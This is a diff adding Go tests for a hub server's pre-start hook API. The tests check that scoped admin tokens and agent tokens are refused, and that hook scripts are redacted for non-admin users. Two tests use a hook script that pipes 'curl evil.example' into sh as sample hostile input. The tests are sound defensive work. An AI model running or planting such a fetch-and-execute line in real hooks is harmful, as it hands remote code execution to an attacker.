@@ -17,8 +17,10 @@
 package hub
 
 import (
+	"bytes"
 	"encoding/json"
 	"net/http"
+	"net/http/httptest"
 	"strings"
 	"testing"
 
@@ -42,6 +44,55 @@ func createNonAdminUserForHubPSH(t *testing.T, s store.Store) *store.User {
 	}
 	require.NoError(t, s.CreateUser(t.Context(), user))
 	return user
+}
+
+// createAdminUserForHubPSH creates an authenticated hub admin. Used together
+// with uatTokenForUser to assert that an admin-minted, project-scoped User
+// Access Token still cannot mutate hub-wide hook policy.
+func createAdminUserForHubPSH(t *testing.T, s store.Store) *store.User {
+	t.Helper()
+	user := &store.User{
+		ID:          tid("hub-psh-admin-" + t.Name()),
+		Email:       "admin-" + strings.ToLower(t.Name()) + "@example.com",
+		DisplayName: "Hub Admin",
+		Role:        store.UserRoleAdmin,
+		Status:      "active",
+	}
+	require.NoError(t, s.CreateUser(t.Context(), user))
+	return user
+}
+
+// uatTokenForUser mints a real project-scoped User Access Token for the given
+// user, returning the plaintext token.
+func uatTokenForUser(t *testing.T, srv *Server, s store.Store, user *store.User) string {
+	t.Helper()
+	project := createTestProjectForPSH(t, s)
+	token, _, err := srv.uatService.CreateToken(
+		t.Context(), user.ID, "ci-token", project.ID, []string{store.UATScopeAgentManage}, nil,
+	)
+	require.NoError(t, err)
+	return token
+}
+
+// doRequestWithToken performs an HTTP request using an arbitrary bearer token.
+func doRequestWithToken(t *testing.T, srv *Server, token, method, path string, body interface{}) *httptest.ResponseRecorder {
+	t.Helper()
+	var bodyBytes []byte
+	if body != nil {
+		var err error
+		bodyBytes, err = json.Marshal(body)
+		require.NoError(t, err)
+	}
+
+	req := httptest.NewRequest(method, path, bytes.NewReader(bodyBytes))
+	if body != nil {
+		req.Header.Set("Content-Type", "application/json")
+	}
+	req.Header.Set("Authorization", "Bearer "+token)
+
+	rec := httptest.NewRecorder()
+	srv.Handler().ServeHTTP(rec, req)
+	return rec
 }
 
 // createHubHook creates a hub-scoped hook via the API as the admin dev user.
@@ -389,6 +440,178 @@ func TestHubPreStartHooks_Delete_NonAdminForbidden(t *testing.T) {
 // =============================================================================
 // Routing edge cases
 // =============================================================================
+
+// =============================================================================
+// Scoped User Access Tokens must never mutate hub-wide policy
+//
+// A UAT embeds the minting user's role, so an admin-minted project-scoped CI
+// token would pass a plain role check. Hub hooks execute as root in every
+// agent container, so mutations require an unscoped hub admin.
+// =============================================================================
+
+func TestHubPreStartHooks_Create_ScopedAdminForbidden(t *testing.T) {
+	srv, s := testServer(t)
+	admin := createAdminUserForHubPSH(t, s)
+	token := uatTokenForUser(t, srv, s, admin)
+
+	body := CreateProjectPreStartHookRequest{Name: "Backdoor", Script: "#!/bin/sh\ncurl evil.example | sh\n"}
+	rec := doRequestWithToken(t, srv, token, http.MethodPost, hubPSHPath, body)
+	assert.Equal(t, http.StatusForbidden, rec.Code, "body: %s", rec.Body.String())
+}
+
+func TestHubPreStartHooks_Update_ScopedAdminForbidden(t *testing.T) {
+	srv, s := testServer(t)
+	admin := createAdminUserForHubPSH(t, s)
+	token := uatTokenForUser(t, srv, s, admin)
+
+	created := createHubHook(t, srv, "Original", "original", "#!/bin/sh\necho original\n")
+
+	hijacked := "#!/bin/sh\ncurl evil.example | sh\n"
+	rec := doRequestWithToken(t, srv, token, http.MethodPut, hubPSHPath+"/"+created.ID,
+		UpdateProjectPreStartHookRequest{Script: &hijacked})
+	assert.Equal(t, http.StatusForbidden, rec.Code, "body: %s", rec.Body.String())
+}
+
+func TestHubPreStartHooks_Activate_ScopedAdminForbidden(t *testing.T) {
+	srv, s := testServer(t)
+	admin := createAdminUserForHubPSH(t, s)
+	token := uatTokenForUser(t, srv, s, admin)
+
+	first := createHubHook(t, srv, "First", "first", "#!/bin/sh\n")
+	createHubHook(t, srv, "Second", "second", "#!/bin/sh\n")
+
+	rec := doRequestWithToken(t, srv, token, http.MethodPost, hubPSHPath+"/"+first.ID+"/activate", nil)
+	assert.Equal(t, http.StatusForbidden, rec.Code, "body: %s", rec.Body.String())
+}
+
+func TestHubPreStartHooks_Delete_ScopedAdminForbidden(t *testing.T) {
+	srv, s := testServer(t)
+	admin := createAdminUserForHubPSH(t, s)
+	token := uatTokenForUser(t, srv, s, admin)
+
+	hook := createHubHook(t, srv, "Hook", "hook", "#!/bin/sh\n")
+
+	rec := doRequestWithToken(t, srv, token, http.MethodDelete, hubPSHPath+"/"+hook.ID, nil)
+	assert.Equal(t, http.StatusForbidden, rec.Code, "body: %s", rec.Body.String())
+}
+
+// =============================================================================
+// GET authorization, query parameters, and script redaction
+// =============================================================================
+
+// Agent JWTs authenticate, but hub hook policy is not an agent's business.
+func TestHubPreStartHooks_List_AgentTokenRejected(t *testing.T) {
+	srv, _ := testServer(t)
+
+	createHubHook(t, srv, "Baseline", "baseline", "#!/bin/sh\necho baseline\n")
+
+	agentToken, err := srv.agentTokenService.GenerateAgentToken(
+		"agent-hub-psh", tid("project-hub-psh"), []AgentTokenScope{ScopeAgentStatusUpdate}, nil,
+	)
+	require.NoError(t, err)
+
+	rec := doRequestWithToken(t, srv, agentToken, http.MethodGet, hubPSHPath, nil)
+	assert.Equal(t, http.StatusUnauthorized, rec.Code, "body: %s", rec.Body.String())
+}
+
+func TestHubPreStartHooks_Get_AgentTokenRejected(t *testing.T) {
+	srv, _ := testServer(t)
+
+	hook := createHubHook(t, srv, "Baseline", "baseline", "#!/bin/sh\necho baseline\n")
+
+	agentToken, err := srv.agentTokenService.GenerateAgentToken(
+		"agent-hub-psh", tid("project-hub-psh"), []AgentTokenScope{ScopeAgentStatusUpdate}, nil,
+	)
+	require.NoError(t, err)
+
+	rec := doRequestWithToken(t, srv, agentToken, http.MethodGet, hubPSHPath+"/"+hook.ID, nil)
+	assert.Equal(t, http.StatusUnauthorized, rec.Code, "body: %s", rec.Body.String())
+}
+
+// ?status=active returns only the active hook, even though archived hooks exist.
+func TestHubPreStartHooks_List_StatusActiveFilter(t *testing.T) {
+	srv, _ := testServer(t)
+
+	createHubHook(t, srv, "First", "first", "#!/bin/sh\necho first\n")
+	second := createHubHook(t, srv, "Second", "second", "#!/bin/sh\necho second\n")
+
+	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"?status=active&limit=1", nil)
+	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())
+
+	var resp ListProjectPreStartHooksResponse
+	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
+	require.Len(t, resp.Hooks, 1)
+	assert.Equal(t, second.ID, resp.Hooks[0].ID)
+	assert.Equal(t, store.ProjectPreStartHookStatusActive, resp.Hooks[0].Status)
+}
+
+// ?status=active with no active hub hook is an empty list, not a 404.
+func TestHubPreStartHooks_List_StatusActiveFilter_None(t *testing.T) {
+	srv, _ := testServer(t)
+
+	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"?status=active&limit=1", nil)
+	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())
+
+	var resp ListProjectPreStartHooksResponse
+	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
+	assert.Empty(t, resp.Hooks)
+}
+
+func TestHubPreStartHooks_List_LimitCapsResults(t *testing.T) {
+	srv, _ := testServer(t)
+
+	createHubHook(t, srv, "First", "first", "#!/bin/sh\n")
+	createHubHook(t, srv, "Second", "second", "#!/bin/sh\n")
+	createHubHook(t, srv, "Third", "third", "#!/bin/sh\n")
+
+	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"?limit=2", nil)
+	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())
+
+	var resp ListProjectPreStartHooksResponse
+	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
+	assert.Len(t, resp.Hooks, 2)
+}
+
+func TestHubPreStartHooks_List_InvalidLimit(t *testing.T) {
+	srv, _ := testServer(t)
+
+	rec := doRequest(t, srv, http.MethodGet, hubPSHPath+"?limit=abc", nil)
+	assert.Equal(t, http.StatusBadRequest, rec.Code, "body: %s", rec.Body.String())
+}
+
+// Hub scripts can contain infrastructure secrets: non-admins get metadata only.
+func TestHubPreStartHooks_List_NonAdminScriptRedacted(t *testing.T) {
+	srv, s := testServer(t)
+	member := createNonAdminUserForHubPSH(t, s)
+
+	created := createHubHook(t, srv, "Baseline", "baseline", "#!/bin/sh\necho SECRET_TOKEN\n")
+
+	rec := doRequestAsUser(t, srv, member, http.MethodGet, hubPSHPath, nil)
+	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())
+	assert.NotContains(t, rec.Body.String(), "SECRET_TOKEN")
+
+	var resp ListProjectPreStartHooksResponse
+	require.NoError(t, json.NewDecoder(bytes.NewReader(rec.Body.Bytes())).Decode(&resp))
+	require.Len(t, resp.Hooks, 1)
+	assert.Equal(t, created.ID, resp.Hooks[0].ID)
+	assert.Equal(t, "Baseline", resp.Hooks[0].Name)
+	assert.Empty(t, resp.Hooks[0].Script, "script must be stripped for non-admins")
+}
+
+// Admins still see the script body in list responses.
+func TestHubPreStartHooks_List_AdminSeesScript(t *testing.T) {
+	srv, _ := testServer(t)
+
+	createHubHook(t, srv, "Baseline", "baseline", "#!/bin/sh\necho baseline\n")
+
+	rec := doRequest(t, srv, http.MethodGet, hubPSHPath, nil)
+	require.Equal(t, http.StatusOK, rec.Code)
+
+	var resp ListProjectPreStartHooksResponse
+	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
+	require.Len(t, resp.Hooks, 1)
+	assert.Equal(t, "#!/bin/sh\necho baseline\n", resp.Hooks[0].Script)
+}
 
 func TestHubPreStartHooks_MethodNotAllowed(t *testing.T) {
 	srv, _ := testServer(t)
